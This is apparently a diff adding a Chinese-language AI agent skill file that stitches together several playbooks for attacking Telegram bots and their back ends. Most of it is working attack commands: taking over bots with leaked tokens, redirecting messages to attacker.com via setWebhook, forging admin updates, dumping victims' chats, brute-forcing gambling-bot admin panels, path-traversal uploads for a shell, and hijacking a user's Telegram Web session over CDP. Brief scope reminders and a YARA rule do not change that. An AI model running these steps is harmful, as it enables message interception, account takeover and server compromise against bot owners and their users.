@@ -1,0 +1,743 @@
+---
+name: tg-bot-webhook-hijack
+description: >-
+ TG Bot 渗透逆向全链（5 面攻击面）：
+ A 面 Token 泄露→全接管（JS 硬编码/GitHub/.env/恶意样本/测绘 body 搜）；
+ B 面 Webhook 伪造（secret_token 校验缺失/CVE-2026-28454/框架差异矩阵）；
+ C 面 Bot 业务逻辑（/start payload 注入/callback_data 篡改/Stars 支付伪造/IDOR）；
+ D 面 恶意生态情报（C2 拦截/Stealer 逆向/Drainer 家族/聚类运营者）；
+ E 面 客户端源码供应链（框架 CVE 审计/供应链投毒检测/MTProto 协议攻击）。
+ 含 BOLA 越权写 /admin/telegram/bot 配置、Webhook 劫持、
+ Bot Token 泄露 getMe/getUpdates/setWebhook/sendMessage 接管、
+ 伪造 Update JSON、callback_query 伪造、Fatal Error 行号溯源、
+ ANY.RUN 拦截方法论、PyInstaller 解包、JS 反混淆、供应链投毒、
+ matkap 猎杀面板、Netlas/FOFA body 搜 token。
+ 用户提到：TG bot 越权/渗透/逆向、admin/telegram/bot、webhook 劫持、
+ Bot Token 泄露、JS 硬编码 bot token、getMe 验证、getUpdates 读消息、
+ setWebhook 覆盖、无签名校验伪造 Update、callback_query 伪造、
+ token 接管、bot 拦截、stealer bot、drainer bot、供应链投毒 bot、
+ matkap、pyronut、CVE-2026-28454、Bot API、Telegram Bot 渗透时使用。
+ Mini App/initData 走 telegram-webapp-api-pentest；
+ 管理后台 NEXTAUTH 走 tg-bot-nextauth-takeover；
+ Bot 池/群发面板走 tg-bot-pool-panel-pentest。
+version: 3.1.0
+
+---
+
+# TG Bot 渗透逆向全链（5 面攻击面）
+
+**前提**：目标在 `config/scope*.json`。`--set-webhook --confirm` 会中断原通知流 → **先问**或用测试 bot。
+
+## 攻击面全景
+
+```
+                 ┌─────────────────────────────────────────────┐
+                 │  目标：一个 TG bot（或运营 bot 的整套业务）   │
+                 └─────────────────────────────────────────────┘
+                                   │
+  ┌──────────────┬────────────────┼───────────────────┬─────────────────┐
+  ▼              ▼                ▼                   ▼                 ▼
+A. Token 面    B. Webhook/后端面  C. Bot 业务逻辑面   D. 生态/情报面    E. 客户端/源码面
+token泄露→接管  伪造update/SSRF   命令注入/IDOR/逻辑  C2拦截/聚类       恶意样本逆向
+前端JS/.env     验签缺失          /start payload     stealer家族       PyInstaller/JS
+GitHub检索      secret_token      callback data      drainer家族       供应链投毒
+```
+
+## 成功口径
+
+| 级别 | BOLA 路径 | Token 泄露链 | Webhook 伪造链 | 业务逻辑链 |
+|------|----------|-------------|---------------|-----------|
+| L1 | USER 可写配置 | `getMe` 有效 | secret_token 缺失确认 | /start payload 注入 |
+| L2 | 自控 URL 收到 Update | `getUpdates` 读到历史 | 伪造 update 执行命令 | callback_data 越权 |
+| L3 | — | webhook 无签名可伪造 | 伪造 admin from.id 提权 | Stars 支付伪造白嫖 |
+| L4 | — | 伪造 callback 触发业务 | 绑定钱包/截获清算 | — |
+
+---
+
+## A 面：Token 泄露 → 全接管（最高频入口）
+
+### Token 格式与核心 API
+
+```bash
+# Token 格式：<bot_id>:<35位secret>
+# grep 正则
+grep -oE '[0-9]{10}:[A-Za-z0-9_-]{35}'
+
+# 验证
+curl -s "https://api.telegram.org/bot${TOKEN}/getMe" | python3 -m json.tool
+
+# 回放历史消息（含聊天上下文）
+curl -s "https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1000"
+
+# 冒充 bot 发消息
+curl -s -X POST "https://api.telegram.org/bot${TOKEN}/sendMessage" \
+  -d chat_id="${CHAT_ID}" -d text="test"
+
+# 查看当前 webhook 配置（评估动静）
+curl -s "https://api.telegram.org/bot${TOKEN}/getWebhookInfo"
+
+# 截流：将所有消息转到攻击者 URL（⚠️ 先问）
+curl -s -X POST "https://api.telegram.org/bot${TOKEN}/setWebhook" \
+  -d url="https://attacker.com/hook"
+
+# 批量转储消息（≤100 条/次）
+curl -s -X POST "https://api.telegram.org/bot${TOKEN}/forwardMessages" \
+  -H "Content-Type: application/json" \
+  -d '{"chat_id":"MY_GROUP","from_chat_id":"VICTIM_CHAT","message_ids":[1,2,3]}'
+```
+
+> ⚠️ 拿到 token 不要立刻 `getUpdates` 拉全部历史——某些运营者会监控 bot 状态。先 `getWebhookInfo`（有 webhook 说明 bot 在跑，动静大），再决定截流还是只 `forwardMessage` 特定消息。
+
+### Token 泄露途径与实战打法
+
+| 途径 | 打法 | 要点 |
+|------|------|------|
+| **客户端 JS 硬编码** | `curl -s https://target/_nuxt/*.js \| grep -oE '[0-9]{10}:[A-Za-z0-9_-]{35}'` | Nuxt/React/Vue chunk 直接硬编码，CVSS 8.1 |
+| **表单请求透传** | 抓 "Contact us" 等表单提交请求，看请求体/URL 是否带 token | 无密码无 2FA 直接登录 bot |
+| **GitHub 仓库/历史** | `gitleaks detect --source . --report-format json`；`trufflehog git https://github.com/target` | 加规则 `[0-9]{10}:[A-Za-z0-9_-]{35}` |
+| **.env / docker-compose** | 目录爆破 + 配置泄露：`/.env`、`/docker-compose.yml`、`/config.yml` | `BOT_TOKEN=` / `TELEGRAM_TOKEN=` |
+| **恶意样本硬编码** | PyInstaller 解包、JS 反混淆、APK 反编译提取 | Stealer/RAT 必带 token 明文 |
+| **钓鱼 kit 泄露** | open dir 挖 `sign/*.html` 每个变体轮换自己的 token | 同站再挖 AiTM 操作台 bot |
+| **kit 开发者后门** | 钓鱼 kit 内置 JQ.js 后门偷运营者 token POST 到硬编码地址 | 先调 Bot API 验证 token 有效性 |
+| **日志泄露** | `laravel.log`、`app.log`、`debug.log` 中搜 token 正则 | Fatal Error 行号溯源 |
+
+### 批量发现（测绘角度）
+
+```bash
+# FOFA 搜包含 Telegram Bot API 调用的站点
+python3 tools/space-search/fofa_query.py 'body="api.telegram.org"' --fields host,ip,port,title
+
+# Netlas 内容搜索（分层：getUpdates 最有价值）
+# http.body="api.telegram.org" AND http.body="getUpdates"
+
+# VirusTotal 检索通信样本 → contacted URL 原文带 token
+# 搜 contacted_urls:api.telegram.org → 提取 token+chat_id
+
+# 本地探针（授权目标）
+python3 tools/ops/tg_bot_token_probe.py hunt \
+  --target https://授权目标 --case <案卷>
+```
+
+---
+
+## B 面：Webhook/后端攻击
+
+### Webhook 签名校验矩阵
+
+| 框架 | 默认是否校验 secret_token | 安全配置 |
+|------|------------------------|---------|
+| python-telegram-bot | ❌ 不校验 | `Application.run_webhook(secret_token=...)` |
+| aiogram | ❌ 需显式 | `run_webhook(secret_token=...)` |
+| telegraf (Node) | ❌ 需显式 | `bot.launch({webhook:{secretToken:...}})` |
+| grammY (Node/Deno) | ❌ 需显式 | `webhookCallback(bot, {secretToken:...})` |
+| php-telegram-bot | ❌ 需显式 | 自行校验 `X-Telegram-Bot-Api-Secret-Token` header |
+
+**未配置 secret_token = 任何人都能 POST 伪造 Update JSON。**
+
+### CVE-2026-28454 — OpenClaw Webhook 无签名（CVSS 9.1）
+
+```
+GHSA-fhvm-j76f-qmjv
+webhook 模式未配置 secret → 接受任意 POST →
+伪造 message.from.id/chat.id → 绕过 sender 白名单执行特权命令。
+```
+
+### F-2026-0005 — Webhook 签名缺失 + Anti-Replay 绕过
+
+```
+控制器不验签，且用攻击者可控的 update_id 当反重放键 →
+完全绕过 anti-replay → 伪造带有效 auth code 的 /start →
+把受害者钱包绑定到自己 TG 账号，截获清算警报。
+```
+
+### 伪造 Update 最小骨架
+
+```json
+{
+  "update_id": 999999,
+  "message": {
+    "message_id": 1,
+    "from": {"id": 67890, "is_bot": false, "first_name": "Attacker"},
+    "chat": {"id": 67890, "type": "private"},
+    "date": 1700000000,
+    "text": "/start VALID_AUTH_CODE_HERE"
+  }
+}
+```
+
+```bash
+# 探测 webhook 端点（常见路径）
+for path in /webhook /bot /telegram/webhook /api/webhook /api/telegram \
+  /bot/webhook /.well-known/telegram; do
+  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
+    "https://target${path}" -H "Content-Type: application/json" \
+    -d '{"update_id":1}')
+  echo "$path → $code"
+done
+
+# 伪造 Update（无 secret_token 时）
+curl -s -X POST "https://target/webhook" \
+  -H "Content-Type: application/json" \
+  -d @fake_update.json
+
+# 伪造 admin 身份执行特权命令
+curl -s -X POST "https://target/webhook" \
+  -H "Content-Type: application/json" \
+  -d '{"update_id":999,"message":{"message_id":1,"from":{"id":ADMIN_ID,"is_bot":false,"first_name":"Admin"},"chat":{"id":ADMIN_ID,"type":"private"},"date":1700000000,"text":"/admin_cmd"}}'
+```
+
+### 反代配置错误
+
+- nginx/网关吞掉 `X-Telegram-Bot-Api-Secret-Token` header → 校验永不生效
+- webhook 路径可预测（/webhook、/bot、Swagger 暴露）
+- `setWebhook` 指向内部地址 → SSRF 面
+- CVE-2025-13068：WordPress Telegram Bot & Channel Plugin 存储型 XSS（username 未净化）
+
+### BOLA 路径（管理 API 越权写 Bot 配置）
+
+```bash
+# USER Token 打 admin 路径
+python3 tools/ops/tg_bot_admin_bac.py probe \
+  --base https://授权API --case <案卷> --token "$USER_JWT"
+```
+
+---
+
+## C 面：Bot 业务逻辑漏洞
+
+| 漏洞类型 | 原理 | 利用手法 |
+|---------|------|---------|
+| **身份只信 from.id** | bot 判权只看 `update.message.from.id`，不验 webhook 来源 | 伪造 update（见 B 面）或用他人真实 ID |
+| **/start payload 注入** | `t.me/bot?start=<payload>` 64 字符上限 | payload 当参数传给后端：SQLi/命令注入/逻辑参数（如 `start=admin_promo` 白嫖） |
+| **callback_data 篡改** | inline button 回调数据客户端可控 | 改 callback_data 触发未授权操作；枚举敏感内容 |
+| **Stars 支付伪造** | 不验 `successful_payment` 真伪就发货 | 伪造支付回调白嫖数字商品（校验 `provider_payment_charge_id`） |
+| **deep-link token 泄露** | 邀请/验证链接把用户标识放 start 参数 | 截获 start payload 撞出未授权态 |
+| **命令/文件路径注入** | bot 后端 shell 拼接用户输入 | echo bot 模板即典型：用户文本直接插 shell → 命令注入 |
+| **LLM bot prompt injection** | AI bot 把聊天内容当指令 | 泄露 system prompt/flag/密钥 |
+| **SQL 注入** | bot 后端拼接查询 | 私密消息全暴露 |
+
+```bash
+# 功能枚举
+# 对目标 bot 发：/start /help /admin /debug /status /config /settings
+# 抓 inline query、callback、web app 按钮、Deep link 参数
+# 从 bot 回包找后端 API 域名 → 转 WebApp/后台打法
+
+# /start payload 注入测试
+# t.me/target_bot?start=admin_promo
+# t.me/target_bot?start='OR+1=1--
+# t.me/target_bot?start=;id;
+
+# callback_data 篡改（需抓包改 callback_query.data）
+# 原始：callback_data="buy_item_123"
+# 篡改：callback_data="buy_item_0" 或 "admin_panel"
+```
+
+---
+
+## D 面：恶意生态情报利用（C2/Stealer/Drainer）
+
+### 拦截 exfil 标准方法论（ANY.RUN 公开技术）
+
+```bash
+# ① 从沙箱/代理抓样本请求 → 拿 token + chat_id
+# ② 查看当前 webhook
+curl -s "https://api.telegram.org/bot${TOKEN}/getWebhookInfo"
+
+# ③ 如有 webhook → 保存配置 → 删除（避免真实接收端抢先消费）
+curl -s "https://api.telegram.org/bot${TOKEN}/deleteWebhook"
+
+# ④ 建 TG 群 + 把自己设匿名 → 把 bot 拉进群
+# ⑤ 重置 update offset
+curl -s "https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1"
+
+# ⑥ 清空历史，此后新消息只发到我们群
+LAST_ID=$(curl -s "https://api.telegram.org/bot${TOKEN}/getUpdates?offset=-1" | python3 -c "import sys,json; r=json.load(sys.stdin); print(r['result'][-1]['update_id']+1 if r['result'] else 0)")
+curl -s "https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${LAST_ID}"
+
+# ⑦ 批量前转运营者消息到我们群
+curl -s -X POST "https://api.telegram.org/bot${TOKEN}/forwardMessages" \
+  -H "Content-Type: application/json" \
+  -d "{\"chat_id\":\"${MY_GROUP}\",\"from_chat_id\":\"${VICTIM_CHAT}\",\"message_ids\":[1,2,3,4,5]}"
+# ≤100 条/次，分钟级可稳定 2000+ 条
+
+# ⑧ 完事恢复 webhook（如原配置存在）
+```
+
+**情报价值**：`getMe`/`getMyDescription`/`getWebhookInfo`/群成员与聊天历史 → 反查运营者身份、家族归属、webhook 基础设施（IOC pivot：webhook.site / *.pipedream.net / *.trycloudflare.com 等中继特征）。
+
+### Drainer 家族逆向要点（JS 层）
+
+- token + chat_id + 运营者钱包地址直接写在 JS 头部变量
+- 区域检查（ipapi.co / cloudflare trace）过滤 CIS → 反向绕过需伪装 IP + navigator.language
+- 混淆对抗：先搜 `api.telegram.org`、`bot`、`chat_id` 字符串锚点 → 沿调用回推
+- 用 de4js / 自写 AST 反混淆 + 运行时 hook console/WebSocket
+
+### Stealer/RAT 逆向链
+
+```bash
+# PyInstaller 解包
+python3 pyinstxtractor.py target.exe
+# 反编译
+uncompyle6 extracted/telegrambt.pyc > telegrambt.py
+# 提取 token
+grep -oE '[0-9]{10}:[A-Za-z0-9_-]{35}' telegrambt.py
+
+# 验证并采集情报
+curl -s "https://api.telegram.org/bot${TOKEN}/getMe"
+curl -s "https://api.telegram.org/bot${TOKEN}/getMyDescription"
+```
+
+### 聚类方法
+
+同 token / 同 webhook URL / 同 bot description → 同一运营者。VirusTotal contacted URL 直接含 token 原文可批量聚类。
+
+---
+
+## E 面：客户端/源码/供应链
+
+### 框架已知 CVE
+
+| 框架 | 漏洞 | 影响 |
+|------|------|------|
+| aiogram < 3.22.0 | initData 校验用 `==` 非 `hmac.compare_digest` | 时序侧信道 |
+| pyTelegramBotAPI | 链 aiohttp CVE-2024-23334 目录穿越 | 文件读 |
+| aiogram | aiohttp CVE-2026-47265/54273-54278 DoS 家族 | 拒绝服务 |
+| node-telegram-bot-api | 废弃依赖 request/form-data/tough-cookie | 多个已知洞 |
+
+```bash
+# 依赖审计（拿到 bot 源码时）
+pip-audit -r requirements.txt
+npm audit
+osv-scanner --lockfile package-lock.json
+```
+
+### 供应链投毒检测
+
+| 恶意包 | 手法 | 检测 |
+|-------|------|------|
+| pyronut | 冒牌 pyrogram，`Client.start()` 植入后门，`/e` = RCE | 检查 `__init__.py` 异常 import |
+| gram-utilz / flashbot-sdk-eth | 同一 TG bot token 收赃 | 提取 token → getMe 反查 |
+| 越南 TG 禁令后 Ruby gems | 替换 API base 指向攻击者 relay | 检查 API endpoint 是否标准 |
+| dsfsdfds PyPI 系列 | `__init__.py` 藏发送逻辑 | grep `api.telegram.org` |
+
+### YARA 规则（样本扫描）
+
+```yara
+rule HUNT_Telegram_Bot_API {
+  strings:
+    $api = "api.telegram.org" ascii wide
+    $getMe = "getMe" ascii
+    $getUpdates = "getUpdates" ascii
+    $setWebhook = "setWebhook" ascii
+    $deleteWebhook = "deleteWebhook" ascii
+    $token = /[0-9]{10}:[A-Za-z0-9_-]{35}/ ascii
+  condition:
+    $api and ($token or 2 of ($getMe, $getUpdates, $setWebhook, $deleteWebhook))
+}
+```
+
+---
+
+## 工具链速查
+
+| 工具 | 用途 | 链接 |
+|------|------|------|
+| **tg_bot_token_probe.py** | token 发现+验证+情报采集+伪造 Update 测试 | `tools/ops/tg_bot_token_probe.py` |
+| **tg_bot_admin_bac.py** | BOLA 越权写 Bot 配置 | `tools/ops/tg_bot_admin_bac.py` |
+| matkap | 恶意 bot 猎杀面板：token 验证/forwardMessage/IOC | github.com/0x6rss/matkap |
+| ANY.RUN scripts | prepare_bot.py/forward_message(s).py 拦截脚本 | github.com/anyrun/blog-scripts |
+| gitleaks / trufflehog | 仓库 token 扫描 | gitleaks.github.io |
+| pip-audit / npm audit | bot 源码依赖审计 | — |
+| pyinstxtractor | PyInstaller 解包 | github.com/extremecoders-re/pyinstxtractor |
+| de4js | JS 反混淆 | leizongmin.github.io/de4js |
+| Netlas / FOFA / Shodan | body 搜 `api.telegram.org` | — |
+
+## 强制行为
+
+1. 先用 USER Token 打 admin 路径证明越权，再谈劫持。
+2. 默认 `probe` **不改** webhook；显式 `--set-webhook --confirm` 才写。
+3. 授权测试结束后建议恢复原 webhook。
+4. 通知/STATUS 脱敏，不把 bot token 写进可公开文档。
+5. 拿到 token 先 `getWebhookInfo` 评估动静，再决定操作深度。
+6. 恶意生态情报采集：只读操作（getMe/getUpdates/forwardMessage），不主动 sendMessage 冒充。
+
+## 实战流程（浓缩）
+
+```
+① 目标确认：bot @username → /start /help 摸功能 → 抓转发链路里的后端域名
+② Token 挖掘：JS/.env/GitHub/git history/测绘 body 搜/恶意样本
+   → getMe 验证 → getWebhookInfo 评估动静 → 最小化利用
+③ 后端渗透：webhook 伪造（无 secret_token）→ 业务洞（SQLi/IDOR/payload）
+   → 管理后台走 tg-bot-nextauth-takeover / tg-bot-pool-panel-pentest
+④ 逆向深化（黑产 bot）：PyInstaller/JS 反混淆/APK → token+chat_id+后端 API
+   → 情报采集+聚类
+⑤ 交付：复现步骤 + 利用链 + 修复建议
+```
+
+## 关联技能
+
+| 场景 | 走哪张卡 |
+|------|---------|
+| 管理后台 NEXTAUTH/KyberRouter | `tg-bot-nextauth-takeover` |
+| Bot 池/群发面板 | `tg-bot-pool-panel-pentest` |
+| Mini App/WebApp initData | `telegram-webapp-api-pentest` |
+| Mini App GraphQL | `telegram-miniapp-graphql-pentest` |
+| Bot 侦察发现 | `telegram-bot-discovery` |
+| TG 云控面板 Fernet/Sticker | `tg-cloud-panel` |
+| TG 号码管理后台 | `tg-number-admin-pentest` |
+
+## 真源
+
+- `docs/playbooks/TGbot渗透逆向全链手法.md`（A-E 五面全链）
+- `docs/playbooks/TG-Bot管理面越权与Webhook劫持手法.md`（§1-§9 BOLA 路径）
+- 探针：`tools/ops/tg_bot_token_probe.py`
+- 参考：CVE-2026-28454 (GHSA-fhvm-j76f-qmjv)、F-2026-0005 (zealynx)
+
+---
+
+<!-- 补充视角: tg-bot-backend-pentest (兄弟技能库 2026-09-12) -->
+
+---
+name: tg-bot-backend-pentest
+description: "打TG机器人/小程序后台: 空间测绘语法+弱口令+路径穿越上传。"
+---
+
+# TG 机器人/小程序博彩站后台渗透(TGSEC 方法论)
+
+针对 TG Bot 后台、小程序/H5 博彩站的打法。核心:**用搜索代替扫描**(Shodan/Fofa 语法找面板)+ **手动弱口令**(30% 直接进)+ **路径穿越上传 getshell**。
+
+## 何时使用
+
+- 目标为 TG 下注机器人(Telegram Bot)+ 配套 Web 后台
+- 微信/支付宝小程序内嵌博彩 H5/API
+- 用户提到「tg bot」「机器人后台」「bot_token」「telegram 面板」
+- 需要批量找 Bot 管理后台(空间测绘)
+
+## 第 1 步: 空间测绘语法找 Bot 后台(搜代替扫)
+
+**Shodan**(shodan.io,注册免费额度):
+```
+http.title:"bot" port:443
+http.title:"telegram" http.html:"bot"
+http.title:"panel" http.html:"telegram"
+http.html:"bot_token"
+http.title:"dashboard" http.html:"/bot"
+```
+
+**Fofa**(fofa.info,注册即用):
+```
+title="Bot" && body="telegram"
+body="bot_token" && port="443"
+title="Dashboard" && body="bot" && country="US"
+header="nginx" && body="telegram_bot"
+body="bot" && port="8080"        # 非标准端口防护更弱, 弱口令概率高
+```
+
+## 第 2 步: 手动弱口令(先手动后字典)
+
+```
+手动先试(至少 30% 面板直接进):
+  admin/admin  admin/123456  admin/password  root/root
+  admin/admin123  test/test  空/空
+
+字典爆破(hydra):
+  hydra -L user.txt -P pass.txt 目标IP http-post-form \
+    "/login:user=^USER^&pass=^PASS^:F=错误"
+  # 间隔 2-3 秒一个请求, 一秒几十发会被封 IP
+```
+
+**4 步流程**: ①搜语法找面板 → ②确认是 Bot 管理后台 → ③手动弱口令(5 分钟)→ ④看 Bot Token/聊天记录/用户数据
+
+## 第 3 步: Bot Token 接管(拿到 token = 全接管)
+
+```
+curl https://api.telegram.org/bot<TOKEN>/getMe          # 验证
+curl https://api.telegram.org/bot<TOKEN>/getUpdates?offset=-1000   # 回放聊天记录
+curl -X POST https://api.telegram.org/bot<TOKEN>/sendMessage -d chat_id=<ID> -d text="..."
+Token 泄露途径: GitHub 仓库/历史提交、客户端 JS、.env/docker-compose
+```
+
+## 第 4 步: 路径穿越 + Vue 头像上传 getshell
+
+```
+脆弱代码(90% 后端直接拼接):
+  const path = "/uploads/avatar/" + file.name;
+  fs.writeFileSync(path, file.buffer);
+
+利用:
+  抓包 POST /api/user/avatar → 改 filename:
+    filename="../../../public/index.html"
+    filename="../../router/index.js"
+  Vue 项目: /var/www/html/dist/ → 头像 /uploads/avatar/ → 跳 3-4 层
+
+先确认洞(别急着拿 shell):
+  filename=../test.txt → 访问 /uploads/test.txt 是否在上级目录
+  ..;/test.txt (后端过滤 ../ 但没过滤 ..;)
+
+绕过:
+  1. 编码: ..%2f..%2f..%2fetc/passwd / 二次编码 ..%252f
+  2. 规范化: ....//....//etc/passwd (过滤只删一次)
+  3. 绝对路径: /etc/passwd
+  4. NULL 截断(老 PHP): %00.jpg
+```
+
+## 第 5 步: 渗透思维链(比 Payload 重要)
+
+```
+三个问题: ①它暴露了什么(挖深一层) ②能跟什么串起来(攻击链)
+          ③离目标多远(后台/数据库/Shell 三选一)
+先动起来: 看到 Swagger→翻API / JWT→解payload / .git→拖源码
+别死磕:   同一目标五个门, 一个堵了换下一个
+经验变直觉: Nginx报错→CVE / 403图标加载→目录存在换法绕 / 报错栈→拼路径穿越
+```
+
+## 关联
+
+- 完整手册: `D:\博彩通杀\TG机器人与小程序博彩站攻击思路.md`
+- 相关技能: smm-panel-pentest(Yii2 面板)、white-label-casino-pentest、wasm-ws-protocol-crack
+
+---
+
+<!-- 补充视角: tg-bot-live-pentest (兄弟技能库 2026-09-12) -->
+
+---
+name: tg-bot-live-pentest
+description: "TG bot实弹渗透: CDP接管TG Web会话+商户API网关HMAC测试。触发: bot渗透, 商户API。"
+---
+
+# TG Bot 实弹渗透(会话接管 + 商户/API 网关)
+
+从「目标 bot + 用户 TG 会话」到「摸清后端/商户体系/资金链」的实战执行手册。适用于用户已在 TG(网页版/桌面/指纹浏览器)打开目标 bot 聊天的场景。攻击面理论与资料汇编见 `tg-bot-pentest-reverse`;本技能是「已经拿到会话后怎么打」的落地步骤。
+
+## 触发
+- 用户说「渗透/逆向/接管这个 bot」且能提供 TG 会话(浏览器已打开 bot 聊天)
+- 目标为 TG 钱包/支付/博彩 bot,带商户体系(充值/出款/API)
+- 需要自动化驱动 TG Web 做点击/读取/发消息
+
+## 第 1 步: 摸清目标家族(静态侦察)
+- `curl t.me/<bot>`(走代理)拿简介/频道/客服用户名;t.me/s/<频道> 可无登录看频道全文
+- 搜「bot名 + walletbot / github 复刻」→ 常能找到开源逆向版 = 架构图纸(Go+Gin+MySQL+Redis+TRON 是 TG 钱包 bot 标配)
+- 同族扩散:@ok28 游戏频道、客服 bot、docs 站——docs/官网常在 CF 后,用已过 CF 的浏览器 tab 打开而非硬 curl
+
+## 第 2 步: 接管 TG 会话(指纹浏览器 CDP 最快)
+1. 让用户在比特浏览器(BitBrowser)开一个 TG Web 窗口并登录、打开目标 bot 聊天
+2. 扫调试端口:查 `D:\bitbrowser-cache\<profile>\DevToolsActivePort`(内容=端口+browser path),或 netstat 找新起的 BitBrowser.exe 进程
+3. CDP WebSocket 必须 `suppress_origin=True`,否则握手 403(浏览器没带 --remote-allow-origins)
+4. `curl http://127.0.0.1:<port>/json/list` 找 telegram.org 的 page tab
+5. 读 DOM:innerText 全文 / `querySelectorAll('button')` 枚举可点按钮(含坐标)
+
+Pitfall: 用户普通 Chrome 的 cua 绑定需 `computer_use.grant_existing_profile: true` + **重启服务 才生效**;指纹浏览器自带调试端口,无需授权更快。
+
+## 第 3 步: TG Web K 版驱动要点(大量实测坑)
+- `location.hash = '#@bot'` **不切换聊天**;K 版需点左上搜索框输入 @名字→点结果;点错会进 typosquat 山寨 bot(核对 users 数与标题)
+- JS `element.click()` 不触发 React 合成事件 → 用 CDP `Input.dispatchMouseEvent`(mousePressed/mouseReleased)在按钮 `getBoundingClientRect()` 中心真实点击
+- 按钮 y 坐标为负 = 在虚拟滚动区外;先 `Input.dispatchMouseEvent type=mouseWheel` 滚到消息最底,再取最新键盘按钮坐标
+- 历史消息键盘与实时键盘 DOM 重叠 → 取坐标前先滚到底并核对是「最新一条消息」的按钮
+- 输入框填 URL/文本后 Enter **不发送**(K 版自定义 keydown)→ 点发送按钮,或让用户手按 Enter(最省事)
+- 「Translate to English」等浮条会压住按钮 → JS 移除对应 DOM 容器再点
+- 顶部安全弹窗(新登录确认)用 JS `remove()` 掉,别点按钮(会触发安全限制)
+
+## 第 4 步: bot 消息层情报收割
+- 翻聊天记录全文(innerText):商户详情(App ID/密钥)、充值地址、回调地址、同族 @用户名、官方群邀请
+- 用已知 PIN 操作商户设置 → **改回调地址绑自己的 webhook.site**(创建后免登录 curl 查请求日志)
+- 充值地址是每个用户独立 TRC20 地址;入账=链上 3 确认 + txHash 幂等 → **伪造难,勿浪费时间**
+- 起后台进程轮询链上(trongrid /v1/accounts) + webhook.site 请求日志,双通道监控资金事件
+
+## 第 5 步: 商户 API 网关测试(HMAC-SHA256)
+1. docs 站被 CF 挡 → 用已过 CF 的浏览器 tab 执行 JS 抓全文(别 curl)
+2. 下载 SDK zip(php/python/node/java/go),用文档测试向量验证签名实现 100% 一致
+3. 签名规则:去 sign/null/空串(保留 0 与 false)、嵌套点号展开、键 ASCII 升序、`k=v&` 拼接不 URL 编码;`sign=UPPER(HMAC_SHA256(base, token))`
+4. 接口套路:balance → payLink → checkDeposit/checkTransferByTxid → censorUserByTG → transfer
+5. 成功响应也带 sign → 用 verify(恒定时间)确认双向往来
+
+## 第 6 步: 安全面测试 + 风控识别
+- SSRF 测回调地址:内网/保留地址被拒;metadata 域名触发「已记录取证」⚠️ **这是拉黑信号**
+- 风控诊断法:正确 token / 错误 token / 无 sign / 不存在商户 ID **全部返回相同错误** = IP 层风控(还没走到验签),需换出口或等解封
+- 换出口:跳板机 `ssh -D 127.0.0.1:<port> -N`(要密码,后台无 tty 会卡,需 pty);验证出口用 api.ipify.org
+- 充值**不触发**商户回调;回调服务于出款/订单事件 → 要拿 deposit 回调需第二账号真实支付(签名/重放分析核心)
+- 商户「出款审核」在 TG bot 端审批;API 网关域名常与 bot/官网不同(api.<domain>)
+
+## Pitfalls
+- 别用 urllib + socks 打 HTTPS(SSL EOF),用 requests + socks5h 代理
+- SSRF/恶意 callback 探测是「记录取证」风控直接诱因——先评估再发,一次触发=IP 拉黑
+- censorUserByTG 类接口=用户枚举器(exist+username),限速用(120/min)
+- 同族 bot 可能 typosquat:核对 users 数与 og:title
+
+## 关联
+- `tg-bot-pentest-reverse`: 攻击面理论 + 全网资料汇编
+- `tg-bot-backend-pentest`: 打 bot 的 Web 管理后台(测绘/弱口令)
+- `telegram-webapp-api-pentest` / `tg-webapp-pentest`: MiniApp initData 认证
+- 实战案例细节: references/okpay-case-2026-09.md
+
+---
+
+<!-- 补充视角: tg-bot-pentest-reverse (兄弟技能库 2026-09-12) -->
+
+---
+name: tg-bot-pentest-reverse
+description: "TG bot本体渗透逆向: token接管、webhook伪造、消息拦截、客户端逆向。触发: bot渗透。"
+---
+
+# TG Bot 本体渗透与逆向(Token 接管 / Webhook 伪造 / 拦截 / 逆向)
+
+针对 **Telegram Bot 本身**(而非 bot 的 Web 管理后台——那是 `tg-bot-backend-pentest`)的渗透逆向打法。核心事实:**token 即全部权限**,无密码无 2FA;恶意 bot 常把 token+chat_id 硬编码在产物里。
+
+## 何时使用
+- 目标 = 一个 bot(@xxxbot):接管它、读它的消息、冒充它、逆向它的实现
+- 恶意 bot / 黑产 bot(博彩、发卡、盗U、Stealer/RAT/Drainer C2)
+- 目标站 JS/.env/APK 里疑似有 `bot<token>` 或 api.telegram.org 调用
+- 用户提到 bot token / 卡密 bot / drainer / getUpdates / webhook / bot 逆向 / bot 渗透
+
+## 第 1 步: Token 挖掘(拿到 token = 拿到一切)
+
+**格式与验证:**
+```bash
+# 正则: [0-9]{10}:[A-Za-z0-9_-]{35}
+curl -s https://api.telegram.org/bot<TOKEN>/getMe    # 验证有效
+```
+
+**挖掘途径(按性价比):**
+1. 目标站前端 JS:`curl -s https://target/_nuxt/*.js | grep -oE "[0-9]{10}:[A-Za-z0-9_-]{35}"`
+2. 请求抓包:Contact/表单提交等请求里可能直接带 bot token(真实案例:公司客服 bot 被这样接管)
+3. GitHub 仓库与 git history(gitleaks/trufflehog + 上述正则规则)
+4. .env / docker-compose / 配置泄露:`BOT_TOKEN=`
+5. 测绘引擎 body 搜索:Netlas `http.body="api.telegram.org"`;ZoomEye/Fofa `body="bot_token"` / `body="api.telegram.org"`
+6. 恶意样本:VirusTotal 搜与 api.telegram.org 通信的样本,contacted URL 里 token 原文;MalwareBazaar `telegram_bot_api` YARA
+7. APK:`jadx` 解包 grep token;PyInstaller bot 用 pyinstxtractor 解包后反编译 .pyc
+
+## 第 2 步: Token 接管链(控制权)
+
+```bash
+# 先评估动静,别急着拉历史
+curl -s https://api.telegram.org/bot<TOKEN>/getWebhookInfo
+#   ↑ 有 webhook = bot 在跑,动作大会被发现
+
+# 静态验证身份/描述(几乎无痕)
+curl -s https://api.telegram.org/bot<TOKEN>/getMe
+curl -s https://api.telegram.org/bot<TOKEN>/getMyDescription   # 黑产 bot 常在此写广告/卖家 handle/面板链接
+
+# 截流(钓鱼/长期监听场景):把自己的 webhook 设上去
+curl -s -X POST https://api.telegram.org/bot<TOKEN>/setWebhook -d url=https://attacker.example/hook -d secret_token=xxx
+
+# 不改接收端只做情报:getUpdates 回放 + forwardMessage 前转(动静最小)
+curl -s "https://api.telegram.org/bot<TOKEN>/getUpdates?offset=-1000"
+curl -s "https://api.telegram.org/bot<TOKEN>/forwardMessage?chat_id=<MY_GROUP>&from_chat_id=<VICTIM_CHAT>&message_id=<ID>"
+# 批量: POST /forwardMessages ≤100 条/次
+```
+
